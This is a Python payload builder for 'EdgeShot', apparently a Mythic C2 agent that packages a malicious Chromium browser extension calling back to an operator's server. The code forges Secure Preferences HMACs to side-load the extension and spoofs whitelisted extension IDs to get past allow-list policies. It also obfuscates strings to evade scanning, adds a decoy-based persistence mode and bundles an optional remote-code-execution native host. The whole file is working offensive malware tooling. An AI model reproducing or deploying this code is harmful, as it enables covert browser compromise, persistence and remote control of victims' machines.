import base64
import io
import json
import pathlib
import zipfile

from mythic_container.PayloadBuilder import (
    PayloadType,
    BuildParameter,
    BuildParameterType,
    BuildStep,
    BuildResponse,
    BuildStatus,
    SupportedOS,
)

from edgeshot.mythic.deploy.obfuscate import obfuscate_js


def _to_str(value):
    """Coerce any C2 value to str (avoids TypeError on .replace())."""
    if value is None:
        return ""
    if isinstance(value, str):
        return value
    if isinstance(value, (dict, list)):
        return json.dumps(value)
    return str(value)


def _path_join(platform: str, base: str, *parts: str) -> str:
    """Join a base dir and parts with the platform-native separator.

    The Secure Preferences ``path`` field must use backslashes on Windows and
    forward slashes elsewhere. The same value feeds the inject script's
    BROWSER_TARGET_DIR, so the separator must match the target OS.
    """
    sep = "\\" if platform == "windows" else "/"
    base = base.rstrip("\\/")
    if not parts:
        return base
    return base + sep + sep.join(parts)


class EdgeShotAgent(PayloadType):
    name = "EdgeShot"
    # WITHOUT the dot: the Mythic frontend builds `payload_type + "." + file_extension`
    # (see Step5Build.js). With ".zip" we got "EdgeShot..zip" (double dot).
    file_extension = "zip"
    author = "@Fir3n0x"

    # Mythic's "Select Target OS" step IS the target *platform* now: the operator
    # picks Windows / macOS / Linux there, and build() maps self.selected_os to
    # the deploy platform key ("windows"/"linux"/"darwin"). There is no separate
    # "platform" build parameter anymore.
    supported_os = [SupportedOS.Windows, SupportedOS.MacOS, SupportedOS.Linux]

    wrapper = False
    wrapped_payloads = []
    note = (
        "EdgeShot - Chromium MV3 browser-extension agent.\n"
        "Pick the target platform (Windows / macOS / Linux) in the OS step; it "
        "drives stomp/GAP deployment paths and Secure Preferences.\n"
        "HTTP profile setup: set callback_host / callback_port to your C2, "
        "Encryption Type (AESPSK) to 'aes256_hmac', and disable "
        "encrypted_exchange_check. All other http profile options are unused "
        "(the agent schedules its own callbacks via chrome.alarms)."
    )
    description = "EdgeShot - Chromium MV3 browser-extension agent ported to Mythic C2. 3 deployment modes: zip / stomp / GAP."
    supports_dynamic_loading = False

    c2_profiles = ["http"]

    # The agent encrypts its own messages in the Mythic format (AES-256-CBC + HMAC)
    # using the key provided by the http profile. The http profile is a plain
    # transport: it does not decrypt.
    mythic_encrypts = True

    agent_path = pathlib.Path(".") / "edgeshot" / "mythic"
    agent_icon_path = agent_path / "agent_functions" / "edgeshot.png"
    agent_code_path = agent_path / "agent_code"

    build_parameters = [
        BuildParameter(
            name="ADDONNAME",
            parameter_type=BuildParameterType.String,
            description="Display name of the extension (manifest.json)",
            default_value="EdgeShot",
        ),
        BuildParameter(
            name="VERSION",
            parameter_type=BuildParameterType.String,
            description="Extension version",
            default_value="1.0.0",
        ),
        BuildParameter(
            name="DESCRIPTION",
            parameter_type=BuildParameterType.String,
            description="Extension description",
            default_value="",
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.Boolean,
            description="XOR-encode string literals in background.js (evades static string scanning)",
            default_value=False,
        ),
        BuildParameter(
            name="deployment_mode",
            parameter_type=BuildParameterType.ChooseOne,
            description="Extension deployment mode",
            choices=["zip", "stomp", "gap"],
            default_value="zip",
        ),
        BuildParameter(
            name="browser_target",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target browser (stomp/GAP modes: Secure Preferences HMAC seed + store for ID spoofing)",
            choices=["chrome", "edge", "brave", "vivaldi"],
            default_value="chrome",
        ),
        BuildParameter(
            name="spoof_id",
            parameter_type=BuildParameterType.String,
            description="Extension ID to spoof (optional; empty = random ID). Only for stomp/GAP.",
            required=False,
            default_value="",
        ),
        BuildParameter(
            name="secure_preferences",
            parameter_type=BuildParameterType.File,
            description="Target 'Secure Preferences' file (stomp/GAP modes only)",
            required=False,
        ),
        BuildParameter(
            name="extension_icon",
            parameter_type=BuildParameterType.File,
            description="Custom extension icon (PNG/JPEG, any size). Empty = the default EdgeShot logo.",
            required=False,
        ),
        BuildParameter(
            name="device_id",
            parameter_type=BuildParameterType.String,
            description="Windows SID or machine UUID of the target (stomp/GAP modes)",
            required=False,
            default_value="",
        ),
        BuildParameter(
            name="target_dir",
            parameter_type=BuildParameterType.String,
            description="Deployment root on the target (stomp/GAP modes). Empty = platform default (Windows: C:\\ProgramData\\EdgeShot, macOS/Linux: /tmp/.edgeshot).",
            required=False,
            default_value="",
        ),
        BuildParameter(
            name="enable_rce",
            parameter_type=BuildParameterType.Boolean,
            description="Bundle the RCE native host (source + build script); registers under all browsers (Chrome/Edge/Brave/Vivaldi)",
            default_value=False,
        ),
    ]

    build_steps = [
        BuildStep(
            step_name="Configuring",
            step_description="Injecting the C2 variables into the agent template (background.js + manifest.json)",
        ),
        BuildStep(
            step_name="Zipping",
            step_description="Packaging the extension as a ZIP archive",
        ),
    ]

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _resolve_crx_keys(self, spoof_id: str, browser_target: str):
        """
        Resolve the extension public key + CRX ID.

        - spoof_id set: download the whitelisted extension's CRX3 from the store
          and extract its public key (GPO allow-list bypass).
        - otherwise: generate a fresh RSA key pair (random ID).

        Returns (crx_id, public_key_b64). The deploy package is imported lazily
        so the container still starts even without the `cryptography` package
        (only the random-ID path needs it).
        """
        from edgeshot.mythic.deploy import crypto
        from edgeshot.mythic.deploy import manifest as deploy_manifest

        if spoof_id:
            pub_key_b64 = deploy_manifest.get_public_key_for_id(spoof_id, browser_target)
            if not pub_key_b64:
                raise ValueError(
                    f"Could not fetch the public key for spoofed ID '{spoof_id}' "
                    f"from the {browser_target} store. Check the ID and that the "
                    f"container has outbound network access."
                )
            return spoof_id, pub_key_b64

        crx_id, pub_key_b64, _priv_key_b64 = crypto.generate_extension_keys()
        return crx_id, pub_key_b64

    async def _read_uploaded_file(self, file_id: str) -> bytes:
        """Read the raw bytes of an uploaded File build parameter."""
        if not file_id:
            raise ValueError("No 'Secure Preferences' file was uploaded (stomp/GAP modes require it).")

        from mythic_container.MythicRPC import (
            MythicRPCFileGetContentMessage,
            SendMythicRPCFileGetContent,
        )

        resp = await SendMythicRPCFileGetContent(
            MythicRPCFileGetContentMessage(AgentFileID=file_id)
        )
        if not resp or not getattr(resp, "Success", False):
            err = getattr(resp, "Error", "") if resp else "no response"
            raise ValueError(f"Could not read uploaded file (agent_file_id={file_id}): {err}")

        content = getattr(resp, "Contents", None) or getattr(resp, "Content", None)
        if content is None:
            raise ValueError(
                f"Uploaded file read returned no content (agent_file_id={file_id}). "
                f"Response fields: Success={getattr(resp, 'Success', None)}."
            )

        if isinstance(content, bytes):
            return content
        if isinstance(content, str):
            # The RPC returns file bytes base64-encoded.
            try:
                return base64.b64decode(content)
            except Exception:
                return content.encode("utf-8")
        raise ValueError(f"Unexpected file content type: {type(content)}")

    @staticmethod
    def _render_icons(raw: bytes) -> dict:
        """Resize an uploaded image into the 16/48/128 extension icons (Pillow).

        Returns {filename: PNG bytes}. The image is centre-cropped to a square,
        so any aspect ratio is accepted. Pillow ships in the agent container
        (added in the Dockerfile), not in the base Mythic image.
        """
        import io as _io
        from PIL import Image

        img = Image.open(_io.BytesIO(raw)).convert("RGBA")
        w, h = img.size
        side = min(w, h)
        left, top = (w - side) // 2, (h - side) // 2
        img = img.crop((left, top, left + side, top + side))

        out = {}
        for size in (16, 48, 128):
            buf = _io.BytesIO()
            img.resize((size, size), Image.LANCZOS).save(buf, "PNG", optimize=True)
            out[f"icon{size}.png"] = buf.getvalue()
        return out

    async def _resolve_icons(self, extension_icon_id) -> dict:
        """Return {filename: PNG bytes} for the extension icons.

        When the operator uploaded a custom icon (build parameter
        ``extension_icon``), it is resized to 16/48/128; otherwise the committed
        EdgeShot logo icons are used.
        """
        if extension_icon_id:
            raw = await self._read_uploaded_file(extension_icon_id)
            try:
                return self._render_icons(raw)
            except Exception as e:
                raise ValueError(
                    f"Could not decode the uploaded extension icon: {e}. "
                    "Upload a valid PNG or JPEG image."
                )
        icons = {}
        icons_dir = self.agent_code_path / "icons"
        if icons_dir.exists():
            for f in icons_dir.rglob("*.png"):
                if f.is_file():
                    icons[f.name] = f.read_bytes()
        return icons

    def _default_target_dir(self, platform: str) -> str:
        if platform == "windows":
            return r"C:\ProgramData\EdgeShot"
        return "/tmp/.edgeshot"

    def _selected_os_platform(self) -> str:
        """Map Mythic's selected_os (the OS step) to the deploy platform key.

        The payload has no "platform" build parameter anymore: the operator picks
        Windows / macOS / Linux in Mythic's own "Select Operating System" step,
        which arrives here as self.selected_os ("Windows"/"macOS"/"Linux").
        """
        os_value = str(getattr(self, "selected_os", "") or "").strip().lower()
        return {
            "windows": "windows",
            "linux": "linux",
            "macos": "darwin",
            "darwin": "darwin",
        }.get(os_value, "windows")

    def _add_agent_files(self, zout, prefix: str, js_code: str, manifest_code: str, icons: dict) -> None:
        """Bundle manifest.json + background.js (+ icons) under ``prefix``."""
        zout.writestr(f"{prefix}/manifest.json", manifest_code)
        zout.writestr(f"{prefix}/background.js", js_code)

        for name, data in (icons or {}).items():
            zout.writestr(f"{prefix}/icons/{name}", data)

    def _add_rce_source(self, zout) -> None:
        """Bundle everything under agent_code/rce/ (native-host.c, README, and a
        precompiled update.exe if one is present) at the ZIP root under rce/.
        The source is not compiled here (no Windows cross-compiler in the build
        container); a committed update.exe is shipped as-is and the on-target
        inject script runs it directly to self-install the native host."""
        rce_dir = self.agent_code_path / "rce"
        if not rce_dir.exists():
            return
        for f in rce_dir.rglob("*"):
            if f.is_file():
                zout.write(f, f.relative_to(self.agent_code_path))

    # ------------------------------------------------------------------
    # Build
    # ------------------------------------------------------------------

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            addon_name = self.get_parameter("ADDONNAME") or "EdgeShot"
            version = self.get_parameter("VERSION") or "1.0.0"
            description = self.get_parameter("DESCRIPTION") or ""
            deployment_mode = self.get_parameter("deployment_mode") or "zip"
            browser_target = self.get_parameter("browser_target") or "chrome"
            spoof_id = (self.get_parameter("spoof_id") or "").strip()
            device_id = (self.get_parameter("device_id") or "").strip()
            target_dir = (self.get_parameter("target_dir") or "").strip()
            platform = self._selected_os_platform()
            secure_preferences_id = self.get_parameter("secure_preferences")
            extension_icon_id = self.get_parameter("extension_icon")
            # Boolean build params may arrive as a Python bool or a "true"/"false" string.
            rce_enabled = self.get_parameter("enable_rce") in (True, "true", "True", "1", 1)
            obfuscate = self.get_parameter("obfuscate") in (True, "true", "True", "1", 1)

            # --- C2 info (http profile) -------------------------------------
            c2_params = {}
            if self.c2info and len(self.c2info) > 0:
                c2_params = self.c2info[0].get_parameters_dict()

            callback_host = _to_str(c2_params.get("callback_host", ""))
            callback_port = _to_str(c2_params.get("callback_port", "80"))

            # --- AES key ----------------------------------------------------
            # The http profile (Go, v1.1.x) exposes "AESPSK" as a crypto SELECTOR
            # (CHOOSE_ONE + IsCryptoType), not as the key itself. The build
            # message therefore provides it as a dict:
            #   {"value": "aes256_hmac"|"none", "enc_key": base64|null, "dec_key": base64|null}
            # The real AES-256 key (32 bytes) is in "enc_key", base64-encoded.
            aes_psk_raw = c2_params.get("AESPSK")
            if aes_psk_raw is None:
                aes_psk_raw = c2_params.get("aes_psk")

            aes_psk = ""
            if isinstance(aes_psk_raw, dict):
                enc_key = aes_psk_raw.get("enc_key")
                if isinstance(enc_key, str) and enc_key:
                    aes_psk = enc_key  # base64 of the 32 key bytes
                elif isinstance(enc_key, (list, tuple)):
                    aes_psk = _to_str(bytes(enc_key))  # fallback (should not happen)
            elif isinstance(aes_psk_raw, str):
                # legacy format (plaintext hex key) or literal "aes256_hmac"/"none"
                aes_psk = aes_psk_raw

            if not aes_psk or aes_psk in ("none", "aes256_hmac"):
                raise ValueError(
                    "No AES key was generated: the http profile did not provide an "
                    "AES-256 key, so the EdgeShot agent (which always encrypts) "
                    "cannot build.\n"
                    "Fix in the Mythic UI: C2 Profiles -> your 'http' instance -> "
                    "set 'AESPSK' / 'Encryption Type' to 'aes256_hmac' (not 'none'), "
                    "leave 'Perform Key Exchange' (encrypted_exchange_check) off, "
                    "Save, then rebuild.\n"
                    "If this payload built before, the profile instance was likely "
                    "recreated or edited and 'Encryption Type' fell back to its "
                    "default ('none')."
                )

            # The http profile's encrypted_exchange_check makes Mythic expect an
            # ECDH key exchange on first checkin. EdgeShot uses a static AES key
            # and does not perform that handshake, so it must stay disabled.
            enc_exchange = c2_params.get("encrypted_exchange_check")
            if enc_exchange in (True, "true", "True", "1", 1):
                raise ValueError(
                    "encrypted_exchange_check must be disabled (false): EdgeShot "
                    "uses a static AES key and does not perform the http profile's "
                    "ECDH key exchange. Set it to false in the http profile."
                )

            if callback_host.startswith("http://") or callback_host.startswith("https://"):
                base_url = callback_host.rstrip("/")
            else:
                base_url = f"http://{callback_host}"

            # The profile rejects a leading '/', we add it back here.
            get_uri = _to_str(c2_params.get("get_uri", "index")).lstrip("/")
            post_uri = _to_str(c2_params.get("post_uri", "data")).lstrip("/")
            query_path_name = _to_str(c2_params.get("query_path_name", "q"))

            get_url = f"{base_url}:{callback_port}/{get_uri}"
            post_url = f"{base_url}:{callback_port}/{post_uri}"

            # --- 1. Render background.js ------------------------------------
            bg_template = self.agent_code_path / "background.js"
            with open(bg_template, "r", encoding="utf-8") as f:
                js_code = f.read()

            js_code = js_code.replace("{{UUID}}", self.uuid)
            js_code = js_code.replace("{{AESPSK}}", aes_psk)
            js_code = js_code.replace("{{GET_URL}}", get_url)
            js_code = js_code.replace("{{POST_URL}}", post_url)
            js_code = js_code.replace("{{QUERY_PARAM}}", query_path_name)

            if obfuscate:
                js_code = obfuscate_js(js_code)

            # --- 2. Render manifest.json ------------------------------------
            manifest_template = self.agent_code_path / "manifest.json"
            with open(manifest_template, "r", encoding="utf-8") as f:
                manifest_code = f.read()

            manifest_code = manifest_code.replace("{{ADDONNAME}}", addon_name)
            manifest_code = manifest_code.replace("{{VERSION}}", version)
            manifest_code = manifest_code.replace("{{DESCRIPTION}}", description)
            # nativeMessaging is always in the manifest (hardcoded): the RCE
            # capability is inert until the host is installed, and post-deployment
            # RCE setup needs the permission to already be present.

            # --- 3. Resolve extension icons (custom upload or default logo) --
            icons = await self._resolve_icons(extension_icon_id)

            # --- 4. Dispatch by deployment mode -----------------------------
            if deployment_mode == "zip":
                payload, build_message = self._build_zip(
                    manifest_code=manifest_code,
                    js_code=js_code,
                    rce_enabled=rce_enabled,
                    icons=icons,
                    get_url=get_url,
                    post_url=post_url,
                )
            elif deployment_mode == "stomp":
                payload, build_message = await self._build_stomp(
                    manifest_code=manifest_code,
                    js_code=js_code,
                    rce_enabled=rce_enabled,
                    icons=icons,
                    browser_target=browser_target,
                    spoof_id=spoof_id,
                    device_id=device_id,
                    target_dir=target_dir,
                    platform=platform,
                    secure_preferences_id=secure_preferences_id,
                    get_url=get_url,
                    post_url=post_url,
                )
            elif deployment_mode == "gap":
                payload, build_message = await self._build_gap(
                    manifest_code=manifest_code,
                    js_code=js_code,
                    rce_enabled=rce_enabled,
                    icons=icons,
                    browser_target=browser_target,
                    spoof_id=spoof_id,
                    device_id=device_id,
                    target_dir=target_dir,
                    platform=platform,
                    secure_preferences_id=secure_preferences_id,
                    get_url=get_url,
                    post_url=post_url,
                )
            else:
                raise ValueError(f"Unknown deployment_mode: {deployment_mode}")

            if obfuscate:
                build_message += " background.js obfuscated (XOR string encoding)."

            resp.payload = payload
            resp.build_message = build_message

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_stderr = f"EdgeShot build error: {str(e)}"

        return resp

    # ------------------------------------------------------------------
    # Mode: zip
    # ------------------------------------------------------------------

    def _build_zip(self, *, manifest_code, js_code, rce_enabled, icons, get_url, post_url):
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zout:
            zout.writestr("manifest.json", manifest_code)
            zout.writestr("background.js", js_code)
            for name, data in (icons or {}).items():
                zout.writestr(f"icons/{name}", data)
            if rce_enabled:
                self._add_rce_source(zout)

        build_message = (
            f"EdgeShot payload generated (mode=zip). "
            f"Callback: {get_url} (GET) / {post_url} (POST)."
            + (
                " RCE native host source bundled under rce/ (compile it locally, "
                "then drop via execute_file)."
                if rce_enabled
                else " RCE native host not bundled (drop update.exe via execute_file to activate)."
            )
        )
        return zip_buffer.getvalue(), build_message

    # ------------------------------------------------------------------
    # Mode: stomp
    # ------------------------------------------------------------------

    async def _build_stomp(self, *, manifest_code, js_code, rce_enabled, icons, browser_target,
                           spoof_id, device_id, target_dir, platform, secure_preferences_id,
                           get_url, post_url):
        from edgeshot.mythic.deploy import prefs as deploy_prefs
        from edgeshot.mythic.deploy import inject as deploy_inject
        from edgeshot.mythic.deploy.browser_config import BrowserConfigurator

        # Browser config: gives us the HMAC seed, proc name and profile path.
        cfg = BrowserConfigurator.get_browser_configs(platform)[browser_target]
        # NOTE: an empty seed (Edge/Brave/Vivaldi) does NOT block the build: the
        # HMAC is still computed, it just won't validate until the real seed is
        # populated in browser_config.py.

        if not device_id:
            raise ValueError(
                "stomp mode requires 'device_id' (Windows SID or macOS/Linux machine ID) "
                "to recompute the Secure Preferences HMACs."
            )

        # Extension key + ID (spoof or random).
        crx_id, pub_key_b64 = self._resolve_crx_keys(spoof_id, browser_target)

        # Inject the public key into manifest.json: an unpacked extension's ID is
        # derived from this key, so it must match the Secure Preferences entry.
        manifest_dict = json.loads(manifest_code)
        manifest_dict["key"] = pub_key_b64
        manifest_code_keyed = json.dumps(manifest_dict, indent=2)

        # The extension folder is named by its CRX ID (the script copies
        # extension/<id>/ -> <target_dir>/<id>/), so the Secure Preferences
        # `path` must point at <target_dir>/<id>.
        target_dir = target_dir or self._default_target_dir(platform)
        deploy_path = _path_join(platform, target_dir, crx_id)

        # Read the uploaded (original) Secure Preferences and forge the patched one.
        prefs_raw = await self._read_uploaded_file(secure_preferences_id)
        prefs_text = prefs_raw.decode("utf-8-sig")
        patched_bytes = deploy_prefs.build_secure_preferences(
            prefs_text,
            crx_id,
            deploy_path,
            manifest_dict,
            device_id,
            browser_target,
        )

        # Render the on-target inject script.
        script_text = deploy_inject.render_stomp_script(cfg, target_dir, platform, rce_enabled)
        if not script_text:
            raise ValueError(f"No stomp template for platform '{platform}'.")
        script_filename = deploy_inject.script_name(platform)

        # Assemble the deployment ZIP.
        ext_root = f"extension/{crx_id}"
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zout:
            zout.writestr("SecurePreferencesClean", prefs_raw)
            zout.writestr("Secure Preferences", patched_bytes)
            self._add_agent_files(zout, ext_root, js_code, manifest_code_keyed, icons)
            if rce_enabled:
                self._add_rce_source(zout)
            zout.writestr(script_filename, script_text)

        build_message = (
            f"EdgeShot payload generated (mode=stomp, browser={browser_target}, "
            f"platform={platform}, id={crx_id}{' (spoofed)' if spoof_id else ' (random)'}). "
            f"Deploy root: {target_dir}. Extract the ZIP on the target and run "
            f"{script_filename}. Callback: {get_url} (GET) / {post_url} (POST)."
            + (
                " RCE native host source bundled under rce/ (compile it locally, "
                "then drop via execute_file)."
                if rce_enabled
                else " RCE native host not bundled (drop update.exe via execute_file to activate)."
            )
        )
        return zip_buffer.getvalue(), build_message

    # ------------------------------------------------------------------
    # Mode: GAP (Ghost Anchor Persistence)
    # ------------------------------------------------------------------

    async def _build_gap(self, *, manifest_code, js_code, rce_enabled, icons, browser_target,
                         spoof_id, device_id, target_dir, platform, secure_preferences_id,
                         get_url, post_url):
        from edgeshot.mythic.deploy import prefs as deploy_prefs
        from edgeshot.mythic.deploy import inject as deploy_inject
        from edgeshot.mythic.deploy.browser_config import BrowserConfigurator

        # Browser config + seed guard (same preconditions as stomp).
        cfg = BrowserConfigurator.get_browser_configs(platform)[browser_target]
        # NOTE: an empty seed (Edge/Brave/Vivaldi) does NOT block the build: the
        # HMAC is still computed, it just won't validate until the real seed is
        # populated in browser_config.py.

        if not device_id:
            raise ValueError(
                "GAP mode requires 'device_id' (Windows SID or macOS/Linux machine ID) "
                "to recompute the Secure Preferences HMACs."
            )

        # Extension key + ID (spoof or random). Both A (malicious) and B (benign)
        # carry the SAME key -> same extension ID; only their folder names differ.
        crx_id, pub_key_b64 = self._resolve_crx_keys(spoof_id, browser_target)

        # Malicious manifest (with key).
        manifest_dict = json.loads(manifest_code)
        manifest_dict["key"] = pub_key_b64
        manifest_code_keyed = json.dumps(manifest_dict, indent=2)

        # Benign decoy extension: same key -> same ID. Critically, its manifest is
        # derived from the MALICIOUS manifest so that version, permissions,
        # host_permissions and the background.service_worker filename stay identical.
        # The Service Worker registration DB is keyed by version_id (derived from the
        # manifest version), and ScriptCache by the script URL; if B differs, the
        # browser re-registers the worker and A's cached worker is dropped.
        benign_dict = dict(manifest_dict)
        # The decoy keeps the operator's ADDONNAME/DESCRIPTION (already
        # substituted into the malicious manifest above) — no fixed
        # "Google Docs Offline" disguise. GAP only needs the manifest to stay
        # structurally identical (version, permissions, worker filename).
        benign_code_keyed = json.dumps(benign_dict, indent=2)

        benign_bg_path = self.agent_code_path / "benign" / "background.js"
        with open(benign_bg_path, "r", encoding="utf-8") as f:
            benign_bg_code = f.read()

        target_dir = target_dir or self._default_target_dir(platform)
        malicious_name = crx_id
        # The decoy folder on disk is named after the operator's extension
        # (ADDONNAME, already substituted into the manifest) rather than a
        # hardcoded "GoogleDocsOffline" string.
        benign_name = manifest_dict.get("name") or "EdgeShot"

        deploy_path_a = _path_join(platform, target_dir, malicious_name)
        deploy_path_b = _path_join(platform, target_dir, benign_name)

        # Read the uploaded original Secure Preferences and forge both variants.
        prefs_raw = await self._read_uploaded_file(secure_preferences_id)
        prefs_text = prefs_raw.decode("utf-8-sig")
        prefs_a_bytes = deploy_prefs.build_secure_preferences(
            prefs_text, crx_id, deploy_path_a, manifest_dict, device_id, browser_target,
        )
        prefs_b_bytes = deploy_prefs.build_secure_preferences(
            prefs_text, crx_id, deploy_path_b, benign_dict, device_id, browser_target,
        )

        # Render the two-phase on-target inject script.
        script_text = deploy_inject.render_gap_script(
            cfg, target_dir, malicious_name, benign_name, platform, rce_enabled
        )
        if not script_text:
            raise ValueError(f"No GAP template for platform '{platform}'.")
        script_filename = deploy_inject.script_name(platform)

        # Assemble the deployment ZIP.
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zout:
            zout.writestr("SecurePreferencesClean", prefs_raw)
            zout.writestr("Secure Preferences A", prefs_a_bytes)
            zout.writestr("Secure Preferences B", prefs_b_bytes)
            # Malicious extension A (background.js + icons + optional RCE source).
            self._add_agent_files(zout, "extension_malicious", js_code, manifest_code_keyed, icons)
            if rce_enabled:
                self._add_rce_source(zout)
            # Benign decoy B: same ID, inert worker (re-anchors to A's cached worker).
            zout.writestr("extension_benign/manifest.json", benign_code_keyed)
            zout.writestr("extension_benign/background.js", benign_bg_code)
            # The benign manifest is derived from the malicious one, so it also
            # references icons/*.png — ship them so the decoy loads cleanly.
            for name, data in (icons or {}).items():
                zout.writestr(f"extension_benign/icons/{name}", data)
            zout.writestr(script_filename, script_text)

        build_message = (
            f"EdgeShot payload generated (mode=gap, browser={browser_target}, "
            f"platform={platform}, id={crx_id}{' (spoofed)' if spoof_id else ' (random)'}). "
            f"Deploy root: {target_dir}. Extract the ZIP on the target and run "
            f"{script_filename}. Callback: {get_url} (GET) / {post_url} (POST)."
            + (
                " RCE native host source bundled under rce/ (compile it locally, "
                "then drop via execute_file)."
                if rce_enabled
                else " RCE native host not bundled (drop update.exe via execute_file to activate)."
            )
        )
        return zip_buffer.getvalue(), build_message
